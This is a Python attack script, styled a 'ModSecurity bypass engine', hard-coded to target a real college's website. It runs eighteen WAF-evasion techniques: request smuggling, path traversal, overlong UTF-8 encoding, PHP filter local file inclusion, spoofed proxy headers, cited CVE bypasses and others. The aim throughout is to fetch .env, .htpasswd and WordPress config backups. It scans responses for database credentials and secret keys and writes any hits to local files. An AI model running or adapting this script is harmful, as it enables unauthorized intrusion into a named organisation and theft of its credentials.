#!/usr/bin/env python3
"""
MODSECURITY BYPASS ENGINE v2.1 - FIXED
Target: https://deogiricollege.org
"""

import requests
import urllib3
import sys
import time
import socket
import ssl
import random
import string
from urllib.parse import quote

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET = "https://deogiricollege.org"
FILES = [".env", ".htaccess", ".htpasswd", "wp-config.php.bak"]
TIMEOUT = 20

class C:
    G = '\033[92m'; R = '\033[91m'; Y = '\033[93m'
    B = '\033[94m'; M = '\033[95m'; C = '\033[96m'
    W = '\033[97m'; N = '\033[0m'

def log(status, desc, url, response=None):
    ts = time.strftime("%H:%M:%S")
    if status == "SUCCESS":
        size = len(response.content) if response else 0
        print(f"  {C.G}[{ts}] {status:8} | Size: {size:6} | {desc}{C.N}")
        if size > 50 and response:
            content = response.text[:800]
            print(f"  {C.W}{'─'*60}{C.N}")
            print(f"  {content}")
            print(f"  {C.W}{'─'*60}{C.N}")
            safe_name = url.replace("https://","").replace("/","_").replace(".","_")[:50]
            with open(f"bypass_{safe_name}.txt", "w") as f:
                f.write(f"URL: {url}\nTechnique: {desc}\n\n{response.text}")
            return True
    elif status == "PARTIAL":
        size = len(response.content) if response else 0
        print(f"  {C.Y}[{ts}] {status:8} | Size: {size:6} | {desc}{C.N}")
    elif status == "REDIRECT":
        loc = response.headers.get('Location','') if response else ''
        print(f"  {C.C}[{ts}] {status:8} | {desc:30} | -> {loc[:60]}{C.N}")
    elif status == "BLOCKED":
        code = response.status_code if response else 'ERR'
        print(f"  {C.R}[{ts}] {status:8} | HTTP {code:3} | {desc}{C.N}")
    elif status == "WAF":
        print(f"  {C.M}[{ts}] {status:8} | {desc}{C.N}")
    else:
        print(f"  [{ts}] {desc}")
    return False

def try_req(url, method="GET", headers=None, data=None, desc=""):
    try:
        hdrs = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
        }
        if headers:
            hdrs.update(headers)
        
        r = requests.request(method, url, headers=hdrs, data=data, 
                            verify=False, timeout=TIMEOUT, allow_redirects=False)
        
        sc = r.status_code
        size = len(r.content)
        
        if sc == 200:
            if size > 100 and b"Not Acceptable" not in r.content and b"<!DOCTYPE" not in r.content[:100]:
                return log("SUCCESS", desc, url, r)
            elif size > 1000:
                return log("SUCCESS", f"{desc} (page {size}B)", url, r)
            elif size > 0:
                return log("PARTIAL", f"{desc} (small {size}B)", url, r)
            else:
                return log("PARTIAL", f"{desc} (empty 200)", url, r)
        elif sc in [301, 302]:
            return log("REDIRECT", desc, url, r)
        elif sc == 403:
            return log("BLOCKED", desc, url, r)
        elif sc == 406:
            return log("WAF", desc, url, r)
        else:
            return False
    except:
        return False

# TECHNIQUE 1
def t1_cve_2024_1019(filename):
    print(f"\n{C.Y}{'='*60}{C.N}")
    print(f"{C.Y}[T1] CVE-2024-1019: URL Parsing Bypass{C.N}")
    
    base = f"{TARGET}/{filename}"
    
    for q in ["%3F", "??", "%3F%3F", "%3F%3F%3F"]:
        urls = [
            f"{TARGET}/{q}{filename}",
            f"{TARGET}/{filename}{q}",
            f"{TARGET}/x{q}{filename}",
        ]
        for url in urls:
            try_req(url, desc=f"CVE-2024-1019 {q}: {url.split('/')[-1]}")

# TECHNIQUE 2
def t2_cve_2026_21876(filename):
    print(f"\n{C.Y}[T2] CVE-2026-21876: Multipart Charset Bypass{C.N}")
    
    url = f"{TARGET}/{filename}"
    boundary = "----" + ''.join(random.choices(string.ascii_letters, k=20))
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="x"\r\n'
        f"Content-Type: text/plain; charset=utf-7\r\n\r\nx\r\n"
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="y"\r\n'
        f"Content-Type: text/plain; charset=utf-8\r\n\r\ny\r\n"
        f"--{boundary}--\r\n"
    )
    try_req(url, method="POST",
            headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
            data=body, desc="CVE-2026-21876: charset smuggling")

# TECHNIQUE 3
def t3_content_type_substring(filename):
    print(f"\n{C.Y}[T3] Content-Type Substring Bypass{C.N}")
    url = f"{TARGET}/{filename}"
    
    for ct in [
        "application/x-www-form-urlencoded",
        "multipart/form-data", 
        "text/xml",
        "application/x-amf",
        "application/x-www-form-urlencodedx",
        "xapplication/x-www-form-urlencoded",
        "multipart/form-data;boundary=x",
        "text/xml;charset=utf-7",
    ]:
        try_req(url, method="POST", headers={"Content-Type": ct},
                data="test=1", desc=f"CT: {ct[:40]}")

# TECHNIQUE 4
def t4_request_smuggling(filename):
    print(f"\n{C.Y}[T4] HTTP Request Smuggling{C.N}")
    host = "deogiricollege.org"
    path = f"/{filename}"
    
    smuggled = "0\r\n\r\n"
    second_req = f"GET {path} HTTP/1.1\r\nHost: {host}\r\n\r\n"
    
    payload = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: {len(smuggled + second_req)}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: keep-alive\r\n\r\n"
        f"{smuggled}{second_req}"
    )
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((host, 443))
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        tls = ctx.wrap_socket(sock, server_hostname=host)
        tls.send(payload.encode())
        time.sleep(2)
        resp = b""
        while True:
            try:
                d = tls.recv(4096)
                if not d: break
                resp += d
            except: break
        tls.close()
        
        if resp:
            if b"DB_" in resp or b"AUTH_KEY" in resp or b"SALT" in resp:
                print(f"  {C.G}[SUCCESS] Smuggling! Got content!{C.N}")
                print(resp.decode(errors='ignore')[:1000])
            else:
                text = resp.decode(errors='ignore')
                status_line = text.split('\n')[0] if text else "empty"
                print(f"  {C.Y}[PARTIAL] Smuggling: {status_line[:60]}{C.N}")
    except Exception as e:
        print(f"  {C.R}[ERR] Smuggling: {e}{C.N}")

# TECHNIQUE 5 - FIXED
def t5_parser_mismatch(filename):
    print(f"\n{C.Y}[T5] Request Body Parser Mismatch{C.N}")
    url = f"{TARGET}/{filename}"
    
    try_req(url, method="POST", headers={"Content-Type": "application/json"},
            data='{"path":"/.env"}', desc="JSON parser")
    try_req(url, method="POST", headers={"Content-Type": "text/xml"},
            data='<?xml version="1.0"?><r><path>/.env</path></r>', desc="XML parser")
    try_req(url, method="POST", headers={"Content-Type": "application/x-amf"},
            data=b'\x00\x01\x02\x03', desc="AMF parser")

# TECHNIQUE 6
def t6_unicode_overlong(filename):
    print(f"\n{C.Y}[T6] Unicode & Overlong UTF-8{C.N}")
    
    for url in [
        f"{TARGET}/%c0%2e{filename[1:]}",
        f"{TARGET}/%e0%40%ae{filename[1:]}",
        f"{TARGET}/%c0%ae{filename[1:]}",
        f"{TARGET}/%252e%2565%256e%2576",
        f"{TARGET}/%c0%ae%6e%76",
    ]:
        try_req(url, desc=f"Unicode: {url.split('/')[-1][:30]}")

# TECHNIQUE 7
def t7_path_diff(filename):
    print(f"\n{C.Y}[T7] Path Interpolation Differences{C.N}")
    base = TARGET
    
    for url in [
        f"{base}/{filename};.txt",
        f"{base}/{filename};.html",
        f"{base}/{filename}::$DATA",
        f"{base}/{filename}/",
        f"{base}//{filename}//",
        f"{base}/x/../{filename}",
        f"{base}/{filename}%00php",
        f"{base}/{filename}%2500",
        f"{base}///{filename}",
        f"{base}/./{filename}",
        f"{base}/../../../../../../../..{filename}",
    ]:
        try_req(url, desc=f"Path: {url.split('/')[-1][:25]}")

# TECHNIQUE 8
def t8_range_bypass(filename):
    print(f"\n{C.Y}[T8] Range & Partial Content{C.N}")
    url = f"{TARGET}/{filename}"
    
    for rng in ["bytes=0-", "bytes=0-100", "bytes=0-500", "bytes=-500"]:
        try_req(url, headers={"Range": rng}, desc=f"Range: {rng}")

# TECHNIQUE 9
def t9_rule_950004_bypass(filename):
    print(f"\n{C.Y}[T9] CRS Rule 950004 Bypass{C.N}")
    base = TARGET
    
    for url in [
        f"{base}/{filename}%00",
        f"{base}/{filename}.",
        f"{base}/{filename}%20",
        f"{base}/{filename}%09",
        f"{base}/{filename}/",
        f"{base}/{filename}?redirect=0",
        f"{base}////{filename}",
        f"{base}/./.{filename}",
    ]:
        try_req(url, desc=f"Rule950004: {url.split('/')[-1][:25]}")

# TECHNIQUE 10
def t10_http09_raw(filename):
    print(f"\n{C.Y}[T10] HTTP/0.9 & HTTP/1.0 Raw{C.N}")
    host = "deogiricollege.org"
    path = f"/{filename}"
    
    for http_ver in ["0.9", "1.0"]:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((host, 443))
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            tls = ctx.wrap_socket(sock, server_hostname=host)
            
            if http_ver == "0.9":
                req = f"GET {path}\r\n"
            else:
                req = f"GET {path} HTTP/1.0\r\nHost: {host}\r\nConnection: close\r\n\r\n"
            
            tls.send(req.encode())
            time.sleep(2)
            resp = b""
            while True:
                try:
                    d = tls.recv(4096)
                    if not d: break
                    resp += d
                except: break
            tls.close()
            
            if resp:
                text = resp.decode(errors='ignore')
                if b"DB_" in resp or b"AUTH_KEY" in resp:
                    print(f"  {C.G}[SUCCESS] HTTP/{http_ver}!{C.N}")
                    print(text[:1000])
                elif b"Not Acceptable" not in resp:
                    print(f"  {C.Y}[PARTIAL] HTTP/{http_ver}: {text.split(chr(10))[0][:60]}{C.N}")
                else:
                    print(f"  {C.R}[BLOCKED] HTTP/{http_ver}{C.N}")
        except Exception as e:
            print(f"  {C.R}[ERR] HTTP/{http_ver}: {e}{C.N}")

# TECHNIQUE 11
def t11_negotiation(filename):
    print(f"\n{C.Y}[T11] Apache MultiViews Content Negotiation{C.N}")
    base = TARGET
    name, ext = filename.split('.') if '.' in filename else (filename, '')
    
    for e in ["", ".txt", ".html", ".php", ".xml", ".bak", ".old", "~", ".tmp", ".swp"]:
        try_req(f"{base}/{name}.{ext}{e}", desc=f"MultiViews: {name}.{ext}{e}")
        try_req(f"{base}/{name}{e}.{ext}", desc=f"MultiViews: {name}{e}.{ext}")

# TECHNIQUE 12
def t12_php_wrapper():
    print(f"\n{C.Y}[T12] PHP Wrapper / Include Attack{C.N}")
    
    for endpoint in [f"{TARGET}/index.php", f"{TARGET}/"]:
        for param in ["page", "file", "include", "template", "load"]:
            for wrapper in [
                "php://filter/convert.base64-encode/resource=.env",
                "php://filter/read=convert.base64-encode/resource=.env",
                ".env",
                "../.env",
            ]:
                try_req(f"{endpoint}?{param}={wrapper}", 
                       desc=f"LFI: {param}={wrapper[:25]}")

# TECHNIQUE 13
def t13_wordfence_bypass(filename):
    print(f"\n{C.Y}[T13] Wordfence-Specific Bypass{C.N}")
    base = TARGET
    name, ext = filename.split('.') if '.' in filename else (filename, '')
    
    for url in [
        f"{base}/{filename}?action=view",
        f"{base}/{filename}?wordfence_lh=1",
        f"{base}//wp-content/uploads/{filename}",
        f"{base}//wp-includes/{filename}",
        f"{base}//wp-admin/{filename}",
        f"{base}/{name}{ext}",
        f"{base}/{filename}?XDEBUG_SESSION_START=1",
    ]:
        try_req(url, desc=f"Wordfence: {url.split('/')[-1][:25]}")

# TECHNIQUE 14
def t14_proxy_headers(filename):
    print(f"\n{C.Y}[T14] Proxy & IP Spoofing{C.N}")
    url = f"{TARGET}/{filename}"
    
    header_sets = [
        {"X-Forwarded-For": "127.0.0.1", "X-Forwarded-Proto": "https"},
        {"X-Forwarded-For": "8.8.8.8", "Via": "1.1 google"},
        {"X-Forwarded-For": "66.249.66.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"Forwarded": "for=127.0.0.1;by=127.0.0.1"},
        {"X-Original-URL": f"/{filename}"},
        {"X-Rewrite-URL": f"/{filename}"},
        {"X-HTTP-Method-Override": "GET"},
    ]
    
    for hdrs in header_sets:
        try_req(url, headers=hdrs, 
               desc=f"Proxy: {list(hdrs.keys())[0]}={list(hdrs.values())[0]}")

# TECHNIQUE 15
def t15_chunked_te(filename):
    print(f"\n{C.Y}[T15] Chunked TE Capitalization{C.N}")
    host = "deogiricollege.org"
    path = f"/{filename}"
    
    for te_val in ["Chunked", "CHUNKED", "cHuNkEd"]:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((host, 443))
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            tls = ctx.wrap_socket(sock, server_hostname=host)
            
            req = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: {te_val}\r\nConnection: close\r\n\r\n"
            tls.send(req.encode())
            time.sleep(2)
            resp = b""
            while True:
                try:
                    d = tls.recv(4096)
                    if not d: break
                    resp += d
                except: break
            tls.close()
            
            if resp:
                text = resp.decode(errors='ignore')
                if b"DB_" in resp:
                    print(f"  {C.G}[SUCCESS] TE: {te_val}!{C.N}")
                    print(text[:500])
                elif b"Not Acceptable" not in resp:
                    print(f"  {C.Y}[PARTIAL] TE: {te_val}: {text.split(chr(10))[0][:60]}{C.N}")
        except:
            pass

# TECHNIQUE 16
def t16_body_content_trick(filename):
    print(f"\n{C.Y}[T16] Body Content Confusion{C.N}")
    url = f"{TARGET}/{filename}"
    fake = "DB_NAME=wordpress\nDB_USER=root\nDB_PASSWORD=test\nAUTH_KEY=abc\n"
    
    try_req(url, method="POST", headers={"Content-Type": "application/x-www-form-urlencoded"},
            data=fake, desc="POST .env content")
    try_req(url, method="POST", headers={"Content-Type": "text/plain"},
            data=fake, desc="POST .env content text/plain")

# TECHNIQUE 17
def t17_method_mutation(filename):
    print(f"\n{C.Y}[T17] HTTP Method Mutation{C.N}")
    url = f"{TARGET}/{filename}"
    for method in ["HEAD", "POST", "PUT", "OPTIONS", "PATCH", "PROPFIND"]:
        try_req(url, method=method, desc=f"Method: {method}")

# TECHNIQUE 18
def t18_method_bypass(filename):
    print(f"\n{C.Y}[T18] Method Enforcement Bypass{C.N}")
    host = "deogiricollege.org"
    path = f"/{filename}"
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((host, 443))
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        tls = ctx.wrap_socket(sock, server_hostname=host)
        
        req = f"G{path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
        tls.send(req.encode())
        time.sleep(2)
        resp = b""
        while True:
            try:
                d = tls.recv(4096)
                if not d: break
                resp += d
            except: break
        tls.close()
        
        if resp:
            text = resp.decode(errors='ignore')
            if b"DB_" in resp:
                print(f"  {C.G}[SUCCESS] G-method!{C.N}")
                print(text[:500])
            else:
                print(f"  {C.Y}[PARTIAL] G-method: {text.split(chr(10))[0][:60]}{C.N}")
    except:
        pass

def main():
    print(f"""
{C.M}╔═══════════════════════════════════════════════════╗
║   MODSECURITY BYPASS ENGINE v2.1 - FIXED         ║
║   Target: {TARGET}    ║
╚═══════════════════════════════════════════════════╝{C.N}
    """)
    
    for filename in FILES:
        print(f"\n{C.W}{'█'*55}{C.N}")
        print(f"{C.W}██  TARGETING: {filename}{C.N}")
        print(f"{C.W}{'█'*55}{C.N}")
        
        t1_cve_2024_1019(filename)
        t2_cve_2026_21876(filename)
        t3_content_type_substring(filename)
        t4_request_smuggling(filename)
        t5_parser_mismatch(filename)
        t6_unicode_overlong(filename)
        t7_path_diff(filename)
        t8_range_bypass(filename)
        t9_rule_950004_bypass(filename)
        t10_http09_raw(filename)
        t11_negotiation(filename)
        t13_wordfence_bypass(filename)
        t14_proxy_headers(filename)
        t15_chunked_te(filename)
        t16_body_content_trick(filename)
        t17_method_mutation(filename)
        t18_method_bypass(filename)
    
    t12_php_wrapper()

if __name__ == "__main__":
    main()
